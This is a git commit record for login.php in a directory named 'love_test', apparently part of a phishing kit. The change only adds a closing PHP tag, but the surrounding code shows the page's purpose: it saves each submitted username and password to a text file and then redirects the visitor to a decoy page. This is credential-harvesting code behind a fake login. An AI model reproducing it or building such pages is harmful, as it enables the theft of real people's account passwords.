decea35caf685ef097707831bbfdd61f113b5744
jackvaii <72170193+jackvaii@users.noreply.github.com>
2020-10-01 03:58:18 +0545

    Update login.php

--- sites/love_test/login.php
+++ sites/love_test/login.php
@@ -5,3 +5,4 @@ include 'love.html';
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: love.html');
 exit();
+?>
